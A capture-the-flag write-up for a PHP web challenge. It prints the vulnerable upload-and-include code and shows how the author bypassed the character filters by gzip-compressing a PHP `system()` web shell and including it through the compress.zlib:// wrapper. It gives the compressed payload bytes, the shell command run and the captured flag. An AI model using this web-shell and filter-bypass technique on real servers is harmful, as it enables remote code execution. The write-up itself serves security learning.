# Sorry for my girlfriend's action - CTF Writeup

**Challenge:** Sorry for my girlfriend's action
**Category:** Web / PHP
**Points:** 100


![](attachments/Pasted%20image%2020251130161131.png)



![](attachments/Pasted%20image%2020251130161200.png)



## Code Analysis

```php
<?php
if (!isset($_GET['file']) || !isset($_GET['contents']) || $_SERVER['REQUEST_METHOD'] === 'POST') {
    highlight_file(__FILE__);
    exit;
}

$filename = $_GET['file'];
$contents = $_GET['contents'];

// Content Filters
if (strpos($contents, '<') !== false ||
    strpos($contents, '>') !== false ||
    strpos($contents, '?') ||  // Blocked unless at index 0
    strpos($contents, ';') ||  // Blocked unless at index 0
    strpos($contents, ')') !== false ||
    strlen($filename) > 20 ||
    stripos($contents, 'php') !== false ||
    preg_match("/zip|ph|exp|data|file|ogg|http|ftp|ssh|php|\.\./i", $filename)) {
    exit('Are you hacking me?');
}

chdir('../tmp');
file_put_contents(basename($filename), $contents);

if(filesize(basename($filename)) < 60){
    @include($filename);
}
@unlink($filename);
?>
```

**Constraints:**

1.  **Content:** Cannot contain `<`, `>`, `)`, `php` (case-insensitive). `?` and `;` are only allowed at the very start.
2.  **Filename:** Cannot contain `php`, `data`, `http`, etc. Max length 20.
3.  **Execution:** `file_put_contents` writes to `../tmp/basename($filename)`. `include` executes `$filename`.

## The Plan

1.  Construct a PHP payload: `<?php system($_GET["c"]); ?>`.
2.  Compress this payload using GZIP.
3.  Ensure the **compressed bytes** do not contain any forbidden characters (`<`, `>`, `?`, `;`, `)`, `php`).
    - We can achieve this by brute-forcing padding (comments/whitespace) in the payload until the compressed output is "clean".
4.  Send the clean compressed payload as `contents`.
5.  Set `file` to `compress.zlib://filename`.
    - `file_put_contents` writes the compressed data to `filename`.
    - `include('compress.zlib://filename')` decompresses it and executes the PHP code.

## Payload Generation

We wrote a Python script to generate a clean GZIP payload.

```python
import gzip
import io

def is_clean(data):
    forbidden = [0x3c, 0x3e, 0x3f, 0x3b, 0x29] # < > ? ; )
    for b in data:
        if b in forbidden: return False
    if b'php' in data.lower(): return False
    return True

# ... brute force loop ...
```

We found a valid payload with padding ` ` (space).
Compressed bytes: `1f8b08000000000002ffb3b12fc8285028ae2c2e49cdd5508977770d89564a568ad5b4b6b70300398e1e171b000000`

## Execution

We sent the payload to the server:

- `file`: `compress.zlib://a`
- `contents`: [Compressed Bytes]
- `c`: `ls -la /`

The server executed the command, revealing the flag file: `flag_afa43123533a9bc0229c8df187ac2abcfbea68086be8a7ae863d24b717841fb2.txt`.

We then read the flag using `cat`.

**Flag:** `NOVA_CTF{c0ngr@7e_y0U_kn0W_pHP_w3ll_1e8dc117ab36b48060a1b5253f6d02ba}`


  
